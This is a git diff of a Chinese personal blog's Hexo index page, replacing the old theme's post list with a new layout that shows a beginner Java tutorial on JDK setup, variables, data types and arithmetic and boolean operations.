@@ -1,241 +1,4514 @@
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>xccitのblog</title>
+    <meta name="author" content="CH_ywx" />
+    <meta name="description" content="人生如逆旅,我亦是行人" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/myavatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
 
-  <!DOCTYPE html>
-  <html lang="en">
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="renderer" content="webkit">
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <meta name="description" content=贩卖温柔 | Selling gentleness >
-  <meta name="keywords" content=hexo,xccit,java,springboot,mybatis,ruoyi >
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
 
-  <head>
-    <title>
-      like life | like myself [ xccitのblog ]
-    </title>
-  <meta name="generator" content="Hexo 7.3.0"></head>
 
-  <body>
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
 
-    <link rel="stylesheet" href="/css/header.css">
-<div class="header">
-  <div class="logo">
-    <span class="pull-left">
-      <a id="site-name" href="/">
-        xccit&#39;s blog
-      </a>
-    </span>
-  </div>
-  <ul class="nav-list">
-    
-      <li>
-        <a href="/">
-          首页
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+<script src="/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>XCCITのBLOG</span>
         </a>
-      </li>
-      
-      <li>
-        <a href="/about">
-          关于
-        </a>
-      </li>
-      
-  </ul>
-</div>
-
-      <!--<link rel="stylesheet" href="/css/top-header.css">
-<div id="top-bar" class="fixed">
-
-  <a class="goto-top" href="#"></a>
-  <ul class="bar-list bar-list-1">
-    
-      <li>
-        <p>
-          <a href="/">
-            <text class="bar-text bar-p1">
-              首页
-            </text>
-            <text class="bar-text bar-p2"></text>
-          </a>
-          <text class="bar-p3">/</text>
-        </p>
-      </li>
-      
-      <li>
-        <p>
-          <a href="/about">
-            <text class="bar-text bar-p1">
-              关于
-            </text>
-            <text class="bar-text bar-p2"></text>
-          </a>
-          <text class="bar-p3">/</text>
-        </p>
-      </li>
-      
-  </ul>
-</div>-->
-
-        <div id="content-outer">
-          <div class="content-inner">
-            <link rel="stylesheet" href="/css/index.css">
-<div class="paginator">
-  <div class="content">
-    <div class="contain-box1">
-
-      <div class="hd logodiv">
-        <img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/myavatar.jpg" class="logopng" alt="logo">
-          <p class="logot">
-            xccitのblog
-              <span class="logo_2"></span>
-              <h3 class="words" style="font-weight: bold;font-family: Georgia;">
-                开启编程之旅
-              </h3>
-          </p>
-      </div>
-      <link rel="stylesheet" href="/css/nav.css">
-<div class="hd">
-  <ol class="breadcrumb">
-    
-      <li><a class="ba" href="/about">
-          关于我👀
-        </a></li>
-      
-      <li><a class="ba" href="http://xccit.github.io">
-          访问主站🎃
-        </a></li>
-      
-      <li><a class="ba" target="_blank" rel="noopener" href="https://github.com/xccit">
-          GitHub🧨
-        </a></li>
-      
-  </ol>
-  <hr>
-</div>
-
-    </div>
-    <div class="contain-box2">
-      <link rel="stylesheet" href="/css/index-post.css">
-
-  <div class="recent-posts">
-    <p class="p1">文章列表</p>
-    <div class="recent-post-item">
-      <ul class="notice-list" id="notice-1">
         
-          <li>
-            <a href="/2024/08/08/Java%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/">
-              Java基础笔记
-            </a>
-            <p class="notice-time" datetime="2024-08-08T14:01:51.000Z">
-              2024-08-08
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/08/08/Linux%E6%8C%82%E8%BD%BD%E5%85%89%E7%9B%98%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6/">
-              Linux挂载光盘安装软件
-            </a>
-            <p class="notice-time" datetime="2024-08-08T13:47:29.000Z">
-              2024-08-08
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/08/05/SpringBoot-validation%E5%A6%82%E4%BD%95%E5%88%86%E7%BB%84%E6%A0%A1%E9%AA%8C/">
-              SpringBoot-validation如何分组校验
-            </a>
-            <p class="notice-time" datetime="2024-08-05T05:13:49.000Z">
-              2024-08-05
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/08/03/JWT-SpringBoot%E5%81%9A%E7%99%BB%E5%BD%95%E6%8B%A6%E6%88%AA/">
-              JWT+SpringBoot做登录拦截
-            </a>
-            <p class="notice-time" datetime="2024-08-03T15:16:58.000Z">
-              2024-08-03
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/08/01/SpringBoot%E8%87%AA%E5%AE%9A%E4%B9%89Starter/">
-              SpringBoot自定义Starter
-            </a>
-            <p class="notice-time" datetime="2024-08-01T13:46:21.000Z">
-              2024-08-01
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/07/21/ruoyi-vue%E5%A6%82%E4%BD%95%E4%B8%8D%E9%AA%8C%E8%AF%81Token%E8%AE%BF%E9%97%AE%E6%8E%A5%E5%8F%A3/">
-              ruoyi-vue如何不验证Token访问接口
-            </a>
-            <p class="notice-time" datetime="2024-07-21T12:15:44.000Z">
-              2024-07-21
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/07/13/Docker%E7%AC%94%E8%AE%B0/">
-              Docker基础笔记
-            </a>
-            <p class="notice-time" datetime="2024-07-13T03:51:25.000Z">
-              2024-07-13
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
-              MS08-067漏洞利用
-            </a>
-            <p class="notice-time" datetime="2024-07-12T15:52:28.000Z">
-              2024-07-12
-            </p>
-          </li>
-          
-          <li>
-            <a href="/2024/07/12/SpringBoot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF%E6%95%B0%E6%8D%AE%E6%BA%90%E5%8A%A0%E5%AF%86/">
-              SpringBoot项目开启数据源加密
-            </a>
-            <p class="notice-time" datetime="2024-07-12T15:28:34.000Z">
-              2024-07-12
-            </p>
-          </li>
-          
-      </ul>
-      <div class="list-bottom">
-        <span class="page-number current">1</span>
-      </div>
-    </div>
-
-  </div>
-  
-    </div>
-  </div>
-</div>
-          </div>
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;XCCITのBLOG</span>
         </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
 
-        <link rel="stylesheet" href="/css/footer.css">
-<div class="bottom-outer">
-  <div class="copyright">©2021 - 2021 By Tanger</div>
-  <div class="framework-info">
-    <span>Power by</span>
-    <a class="a1" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
-    <span class="footer-separator">|</span>
-    <span>Theme by</span>
-    <a class="a2" target="_blank" rel="noopener" href="https://github.com/redhat123456/hexo-theme-MiHoYo">MiHoYo</a>
-  </div>
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div id="home-head">
+    <div
+        id="home-background"
+        ref="homeBackground"
+        data-images="/images/background.jpg"
+    ></div>
+    <div id="home-info" @click="homeClick">
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="loop"></span>
+        <span class="info">
+            <div class="wrap">
+                <h1>xccitのblog</h1>
+                <h3>like life | like myself</h3>
+                <h5>人生如逆旅,我亦是行人</h5>
+            </div>
+        </span>
+    </div>
+</div>
+<div
+    id="home-posts-wrap"
+    ref="homePostsWrap"
+    true
+>
+    <div id="home-posts">
+        
+
+<div class="post">
+    <a href="/2024/08/08/Java%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/">
+        <h2 class="post-title">Java基础笔记</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/8/8
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="JAVA快速入门"><a href="#JAVA快速入门" class="headerlink" title="JAVA快速入门"></a>JAVA快速入门</h1><p>注:个人笔记，适合新手学习，适合对Java SE的复习，请勿转载,如有错误请指教，虚心改正 </p>
+<p><code>QQ: 1571466236</code></p>
+<p><code>wechat: lucky_all_time_max</code></p>
+<h2 id="JDK环境配置"><a href="#JDK环境配置" class="headerlink" title="JDK环境配置"></a>JDK环境配置</h2><p>准备环境：JAVA 8（JDK8） Windows 10系统</p>
+<p>本教程使用的是Java8，在2018年企业开始陆续使用JAVA11，到后面13,16都在用，但8是最稳定的一个版本，新版本特性我辞职后没有好好学习，只能使用我所掌握的jdk8</p>
+<p><a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html">Oracle官网</a>下载JDK安装包：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908231449599.png" alt="image-20210908231449599"></p>
+<p>大家可以看到的是页面打开有很多版本，我们需要根据自己所使用的系统进行选择，windows系统使用*.exe*后缀的安装包即可，但在此之前确定好自己的系统是32bit还是64bit，一般家用电脑都是64bit，下载<strong>windows x64</strong>的版本。</p>
+<p>安装步骤很简单且我电脑已经装了多个版本，就不一一给大家截图演示，直接在安装界面点击next或者下一步即可。</p>
+<h3 id="环境变量配置："><a href="#环境变量配置：" class="headerlink" title="环境变量配置："></a>环境变量配置：</h3><h4 id="1-配置JAVA-HOME"><a href="#1-配置JAVA-HOME" class="headerlink" title="1.配置JAVA_HOME"></a>1.配置JAVA_HOME</h4><p>windows10:</p>
+<p>桌面此电脑鼠标右击—-&gt;属性—-&gt;高级系统设置—-&gt;环境变量</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908232718137.png" alt="image-20210908232718137"></p>
+<p>这里注意：上面的是用户变量，切换用户后就会失效，下面的是系统变量，我们要在系统变量中设置环境变量</p>
+<p>新建：JAVA_HOME</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908232848228.png" alt="image-20210908232848228"></p>
+<p>变量值是安装JAVA的路径，安装时注意看好路径，一般默认都在C盘下的Program Files\Java</p>
+<p>找到Path环境变量：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908233118938.png" alt="image-20210908233118938"></p>
+<h4 id="2-配置Path"><a href="#2-配置Path" class="headerlink" title="2.配置Path"></a>2.配置Path</h4><p>将</p>
+<p><strong>%JAVA_HOME%\bin</strong></p>
+<p><strong>%JAVA_HOME%\jre\bin</strong></p>
+<p>加入到Path，将这两条变量值上移到置顶</p>
+<p>确定</p>
+<h4 id="3-配置CLASSPATH"><a href="#3-配置CLASSPATH" class="headerlink" title="3.配置CLASSPATH"></a>3.配置CLASSPATH</h4><p>找到ClASSPATH，没有就新建：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908233317079.png" alt="image-20210908233317079"></p>
+<p>变量值：</p>
+<pre><code class="java">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;
+</code></pre>
+<p>完成后确定，退出来</p>
+<h4 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h4><p>使用组合键WIN+R，输入CMD，回车</p>
+<p>在命令窗口分别输入：</p>
+<p>java -version        </p>
+<p>javac</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908234658646.png" alt="image-20210908234658646"></p>
+<p>这两条命令都有输出的时候代表环境配置成功。</p>
+<h2 id="第一个程序"><a href="#第一个程序" class="headerlink" title="第一个程序"></a>第一个程序</h2><p>新建文件 Hello.java</p>
+<pre><code class="java">public class Hello &#123;
+    public static void main(String[] args) &#123;
+        System.out.println(&quot;Hello, world!&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>它的意思是在屏幕上打印出 Hello,world！ 这行文本内容。</p>
+<p>Java源码本质上是一个文本文件，我们需要先用<code>javac</code>把<code>Hello.java</code>编译成字节码文件<code>Hello.class</code>，然后，用<code>java</code>命令执行这个字节码文件：</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908235215588.png" alt="image-20210908235215588"></p>
+<p>在Hello.java文件目录中运行cmd，使用命令javac Hello.java</p>
+<p>如果源代码无误，上述命令不会有任何输出，而当前目录下会产生一个<code>Hello.class</code>文件：</p>
+<p>使用命令java Hello</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210908235622515.png" alt="image-20210908235622515"></p>
+<p>出现上面结果就很完美，第一个程序运行完成！</p>
+<h4 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h4><p><strong>一个Java源码只能定义一个<code>public</code>类型的class，并且class名称和文件名要完全一致；</strong></p>
+<p><strong>使用<code>javac</code>可以将<code>.java</code>源码编译成<code>.class</code>字节码；</strong></p>
+<p><strong>使用<code>java</code>可以运行一个已编译的Java程序，参数是类名。</strong></p>
+<h3 id="命令行参数："><a href="#命令行参数：" class="headerlink" title="命令行参数："></a>命令行参数：</h3><p>Java程序的入口是<code>main</code>方法，而<code>main</code>方法可以接受一个命令行参数，它是一个<code>String[]</code>数组。</p>
+<p>这个命令行参数由JVM接收用户输入并传给<code>main</code>方法：</p>
+<p>Java的<strong>main</strong>方法后面小括号中有<strong>String[] args</strong>,可以传入参数使用，比如我们写如下代码:</p>
+<pre><code class="java">public class Hello&#123;
+    public static void main(String[] args)&#123;
+        for(String arg : args)&#123;
+            if(arg.equals(&quot;-version&quot;))&#123;
+                System.out.print(&quot;v1.0&quot;);
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20211007165158004-16335967296361.png" alt="image-20211007165158004"></p>
+<p>对程序编译过后运行，带上一个**”-version”<strong>参数，程序做出了反应，将我们设置好的</strong>“v1.0”**打印了出来</p>
+<h2 id="JAVA程序基础"><a href="#JAVA程序基础" class="headerlink" title="JAVA程序基础"></a>JAVA程序基础</h2><p>因为Java是面向对象的语言，一个程序的基本单位就是<code>class</code>，<code>class</code>是关键字，这里定义的<code>class</code>名字就是<code>Hello</code>：</p>
+<pre><code class="java">public class Hello&#123;
+    
+&#125;
+</code></pre>
+<p><strong>注意：</strong></p>
+<p>类名要求：</p>
+<ul>
+<li>类名必须以英文字母开头，后接字母，数字和下划线的组合</li>
+<li>习惯以大写字母开头</li>
+</ul>
+<p>要注意遵守命名习惯，好的类命名：</p>
+<ul>
+<li>Hello</li>
+<li>NoteBook</li>
+<li>VRPlayer</li>
+</ul>
+<p>不好的类命名：</p>
+<ul>
+<li>hello</li>
+<li>Good123</li>
+<li>Note_Book</li>
+<li>_World</li>
+</ul>
+<p><strong>注意：</strong></p>
+<p><code>public</code>是访问修饰符，表示该<code>class</code>是公开的。</p>
+<p>不写<code>public</code>，也能正确编译，但是这个类将无法从命令行执行。</p>
+<p>在<code>class</code>内部，可以定义若干方法（method）：</p>
+<pre><code class="java">public class Hello&#123;
+    public static void main(String[] args)&#123;
+        
+    &#125;
+&#125;
+</code></pre>
+<p>这里的main便是一个<strong>方法</strong>，也称为<strong>函数</strong></p>
+<p>方法定义了一组执行语句，方法内部的代码将会被依次顺序执行。</p>
+<p>这里的方法名是<code>main</code>，返回值是<code>void</code>，表示没有任何返回值。</p>
+<p>我们注意到<code>public</code>除了可以修饰<code>class</code>外，也可以修饰方法。而关键字<code>static</code>是另一个修饰符，它表示静态方法，后面我们会讲解方法的类型，目前，我们只需要知道，Java入口程序规定的方法必须是静态方法，方法名必须为<code>main</code>，括号内的参数必须是String数组。</p>
+<p>方法名也有命名规则，命名和<code>class</code>一样，但是首字母小写：</p>
+<p>好的方法命名：</p>
+<ul>
+<li>main</li>
+<li>goodMorning</li>
+<li>playVR</li>
+</ul>
+<p>不好的方法命名：</p>
+<ul>
+<li>Main</li>
+<li>good123</li>
+<li>good_morning</li>
+<li>_playVR</li>
+</ul>
+<p>在方法内部，语句才是真正的执行代码。<strong>Java的每一行语句必须以分号结束：</strong></p>
+<pre><code class="java">public class Hello &#123;
+    public static void main(String[] args) &#123;
+        System.out.println(&quot;Hello, world!&quot;); // 语句
+    &#125;
+&#125;
+</code></pre>
+<p><strong>注意：</strong></p>
+<p>&#x2F;&#x2F;语句  ：这是Java中的<strong>注释</strong>，代码用于电脑读取，相当于人给电脑的指令，但&#x2F;&#x2F;后面的内容供人阅读，在企业中通常存在程序员离职的情况，这个时候注释的作用就体现出来了，有注释的代码看起来是清晰的，在另一名程序员接手项目的时候可以很快上手。</p>
+<p>注释类型:</p>
+<pre><code class="java">//单行注释
+/*
+  1
+  2
+  3
+  多行注释
+*/
+/**
+@Author Xccit
+Javadoc
+*/
+</code></pre>
+<h2 id="JAVA变量和数据类型"><a href="#JAVA变量和数据类型" class="headerlink" title="JAVA变量和数据类型"></a>JAVA变量和数据类型</h2><p>变量的概念，我们在小学时候就接触到了，解方程做应用题的时候：</p>
+<p>设某某为x，x是一个不确定的量，所以称为变量</p>
+<h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3><pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int x = 100; // 定义int类型变量x，并赋予初始值100
+        System.out.println(x); // 打印该变量的值
+    &#125;
+&#125;
+</code></pre>
+<p>试着运行以上代码：</p>
+<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h4><p>基本数据类型是CPU可以直接进行运算的类型。Java定义了以下几种基本数据类型：</p>
+<ul>
+<li>整数类型：byte，short，int，long</li>
+<li>浮点数类型：float，double</li>
+<li>字符类型：char</li>
+<li>布尔类型：boolean</li>
+</ul>
+<h4 id="引用数据类型"><a href="#引用数据类型" class="headerlink" title="引用数据类型"></a>引用数据类型</h4><p>引用类型最常见的就是String</p>
+<p>在以后的学习中，会使用形形色色的变量，各种数据类型都会使用</p>
+<h4 id="变量的作用范围"><a href="#变量的作用范围" class="headerlink" title="变量的作用范围"></a>变量的作用范围</h4><p>在Java中，多行语句用{ }括起来。很多控制语句，例如条件判断和循环，都以{ }作为它们自身的范围，例如：</p>
+<pre><code class="java">if (...) &#123; // if开始
+    ...
+    while (...) &#123; // while 开始
+        ...
+        if (...) &#123; // if开始
+            ...
+        &#125; // if结束
+        ...
+    &#125; // while结束
+    ...
+&#125; // if结束
+</code></pre>
+<p>只要正确地嵌套这些{ }，编译器就能识别出语句块的开始和结束。而在语句块中定义的变量，它有一个作用域，就是从定义处开始，到语句块结束。超出了作用域引用这些变量，编译器会报错。举个例子：</p>
+<pre><code class="java">&#123;
+    ...
+    int i = 0; // 变量i从这里开始定义
+    ...
+    &#123;
+        ...
+        int x = 1; // 变量x从这里开始定义
+        ...
+        &#123;
+            ...
+            String s = &quot;hello&quot;; // 变量s从这里开始定义
+            ...
+        &#125; // 变量s作用域到此结束
+        ...
+        // 注意，这是一个新的变量s，它和上面的变量同名，
+        // 但是因为作用域不同，它们是两个不同的变量:
+        String s = &quot;hi&quot;;
+        ...
+    &#125; // 变量x和s作用域到此结束
+    ...
+&#125; // 变量i作用域到此结束
+</code></pre>
+<p>定义变量时，要遵循作用域最小化原则，尽量将变量定义在尽可能小的作用域，并且，不要重复使用变量名。</p>
+<h4 id="常量："><a href="#常量：" class="headerlink" title="常量："></a>常量：</h4><p>常量定义：</p>
+<pre><code class="java">final int i = 1;
+</code></pre>
+<p>上面的语句使用关键字<strong>final</strong>定义了一个int类型的常量 i</p>
+<p>常量定义后不可改变其值（不可重新赋值）；</p>
+<h4 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h4><p>Java提供了两种变量类型：基本类型和引用类型</p>
+<p>基本类型包括整型，浮点型，布尔型，字符型。</p>
+<p>变量可重新赋值，等号是赋值语句，不是数学意义的等号。</p>
+<p>常量在初始化后不可重新赋值，使用常量便于理解程序意图。</p>
+<h3 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h3><h4 id="整型运算"><a href="#整型运算" class="headerlink" title="整型运算"></a>整型运算</h4><p>整形运算整数的数值表示不但是精确的，而且整数运算永远是精确的，即使是除法也是精确的，因为两个整数相除只能得到结果的整数部分：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int i = (100 + 200) * (99 - 88); // 3300
+        int n = 7 * (5 + (i - 9)); // 23072
+        System.out.println(i);
+        System.out.println(n);
+    &#125;
+&#125;
+</code></pre>
+<p><strong>溢出:</strong></p>
+<p>要特别注意，整数由于存在范围限制，如果计算结果超出了范围，就会产生溢出，而溢出<em>不会出错</em>，却会得到一个奇怪的结果：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int x = 2147483640;
+        int y = 15;
+        int sum = x + y;
+        System.out.println(sum); // -2147483641
+    &#125;
+&#125;
+</code></pre>
+<p>可以自行运行以上代码测试，关于溢出的概念，大家可以买《Java核心技术》这本书继续稳固和提升。</p>
+<h4 id="浮点型运算"><a href="#浮点型运算" class="headerlink" title="浮点型运算"></a>浮点型运算</h4><p>浮点型运算和整型运算的最大区别，就是浮点型无法进行位运算和移位运算。</p>
+<p>在计算机中，浮点数虽然表示的范围大，但是，浮点数有个非常重要的特点，就是浮点数常常无法精确表示。</p>
+<p><strong>举个栗子：</strong></p>
+<p>浮点数<code>0.1</code>在计算机中就无法精确表示，因为十进制的<code>0.1</code>换算成二进制是一个无限循环小数，很显然，无论使用<code>float</code>还是<code>double</code>，都只能存储一个<code>0.1</code>的近似值。但是，<code>0.5</code>这个浮点数又可以精确地表示。</p>
+<p>因为浮点数常常无法精确表示，因此，浮点数运算会产生误差：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        double x = 1.0 / 10;
+        double y = 1 - 9.0 / 10;
+        // 观察x和y是否相等:
+        System.out.println(x);
+        System.out.println(y);
+    &#125;
+&#125;
+</code></pre>
+<p>由于浮点数存在运算误差，所以比较两个浮点数是否相等常常会出现错误的结果。正确的比较方法是判断两个浮点数之差的绝对值是否小于一个很小的数：</p>
+<pre><code class="java">// 比较x和y是否相等，先计算其差的绝对值:
+double r = Math.abs(x - y);
+// 再判断绝对值是否足够小:
+if (r &lt; 0.00001) &#123;
+    // 可以认为相等
+&#125; else &#123;
+    // 不相等
+&#125;
+</code></pre>
+<p>浮点数在内存的表示方法和整数比更加复杂。Java的浮点数完全遵循<strong>IEEE-754</strong>标准，这也是绝大多数计算机平台都支持的浮点数标准表示方法。</p>
+<p><strong>类型提升：</strong></p>
+<p>如果参与运算的两个数其中一个是整型，那么整型可以自动提升到浮点型：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        int n = 5;
+        double d = 1.2 + 24.0 / n; // 6.0
+        System.out.println(d);
+    &#125;
+&#125;
+</code></pre>
+<p>需要注意的是，在一个复杂的四则运算中出现两个整数的情况下·，整型不会进行类型提升：</p>
+<pre><code class="java">double d = 1.2 + 24 / 5; //5.2
+</code></pre>
+<p>对比如上两条代码，理解类型提升的概念。</p>
+<p><strong>溢出：</strong></p>
+<p>整型运算在除数为0时会报错并结束程序，但在浮点型运算中如果除数为0，不会报错，但会返回几个特殊值：</p>
+<p>NaN：表示 not a number 非数字</p>
+<p>Infinity：表示无穷大</p>
+<p>-Infinity:表示负无穷</p>
+<p>例如：</p>
+<pre><code class="java">double x = 0.0 / 0; //NaN
+double y = 1.0 / 0; //Infinity
+double z = -1.0 / 0; //-Infinity
+</code></pre>
+<p><strong>强制转型：</strong></p>
+<p>可以将浮点数强制转型为整数。在转型时，浮点数的小数部分会被丢掉。如果转型后超过了整型能表示的最大范围，将返回整型的最大值。例如：</p>
+<pre><code class="java">int n1 = (int) 12.3; // 12
+int n2 = (int) 12.7; // 12
+int n2 = (int) -12.7; // -12
+int n3 = (int) (12.7 + 0.5); // 13
+int n4 = (int) 1.2e20; // 2147483647   1后面的小数点后移20位
+</code></pre>
+<p>如果要进行<strong>四舍五入</strong>，可以对浮点数加上0.5再强制转型：</p>
+<pre><code class="java">public class Main &#123;
+    public static void main(String[] args) &#123;
+        double d = 2.6;
+        int n = (int) (d + 0.5);
+        System.out.println(n);
+    &#125;
+&#125;
+</code></pre>
+<p><strong>小结</strong></p>
+<p>浮点数常常无法精确表示，并且浮点数的运算结果可能有误差；</p>
+<p>比较两个浮点数通常比较它们的差的绝对值是否小于一个特定值；</p>
+<p>整型和浮点型运算时，整型会自动提升为浮点型；</p>
+<p>可以将浮点型强制转为整型，但超出范围后将始终返回整型的最大值。</p>
+<h4 id="布尔运算"><a href="#布尔运算" class="headerlink" title="布尔运算"></a>布尔运算</h4><p>对于<strong>boolean</strong>类型，永远只有两个值：<strong>true</strong>和<strong>false</strong></p>
+<p>布尔运算是一种关系运算，包括以下几种运算符:</p>
+<ul>
+<li><p>比较运算符: <code>&lt;   &gt;   &gt;=   &lt;=   ==   != </code></p>
+</li>
+<li><p>与运算 <code>&amp;&amp;</code></p>
+</li>
+<li><p>或运算 <code>||</code></p>
+</li>
+<li><p>非运算  <code> !</code></p>
+<pre><code class="java">boolean isGreater = 5 &gt; 3; // true
+int age = 12;
+boolean isZero = age == 0; // false
+boolean isNonZero = !isZero; // true
+boolean isAdult = age &gt;= 18; // false
+boolean isTeenager = age &gt;6 &amp;&amp; age &lt;18; // true
+</code></pre>
+</li>
+</ul>
+<p>关系运算符的优先级从高到低依次是：</p>
+<ul>
+<li><code>!</code></li>
+<li><code>&gt;</code>，<code>&gt;=</code>，<code>&lt;</code>，<code>&lt;=</code></li>
+<li><code>==</code>，<code>!=</code></li>
+<li><code>&amp;&amp;</code></li>
+<li><code>||</code></li>
+</ul>
